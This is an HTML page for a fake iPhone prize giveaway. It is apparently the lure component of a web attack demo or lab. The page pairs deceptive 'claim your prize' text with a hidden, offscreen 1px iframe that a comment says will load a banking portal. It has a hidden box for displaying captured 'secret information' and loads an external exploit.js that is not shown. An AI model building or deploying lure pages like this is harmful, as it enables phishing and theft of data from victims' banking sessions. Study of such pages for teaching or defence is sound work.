<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Prize!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 {
            color: #e74c3c;
        }
        .prize-image {
            max-width: 100%;
            height: auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 5px;
            margin: 20px 0;
        }
        .button {
            display: inline-block;
            background-color: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            text-decoration: none;
        }
        .button:hover {
            background-color: #c0392b;
        }
        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .hidden {
            display: none;
        }
        #bankFrame {
            width: 1px;
            height: 1px;
            position: absolute;
            left: -100px;
        }
        #secretInfo {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            margin-top: 20px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <h1>Congratulations! You've Been Selected for a Special Prize!</h1>
    
    <p>You are one of our lucky visitors who has been randomly selected to receive a brand new iPhone 16 Pro!</p>
    
    <img src="prize.jpg" alt="iPhone 16 Pro Prize" class="prize-image">
    
    <p>To claim your prize, simply click the button below:</p>
    
    <button id="claimPrizeBtn" class="button">Claim Your Prize Now!</button>
    
    <div id="status" class="hidden"></div>
    
    <div id="secretInfo" class="hidden">
        <h3>Secret Information:</h3>
        <pre id="secretValue">None yet</pre>
    </div>
    
    <!-- Hidden iframe that will load the banking portal -->
    <iframe id="bankFrame" class="hidden"></iframe>
    
    <script src="exploit.js"></script>
</body>
</html>
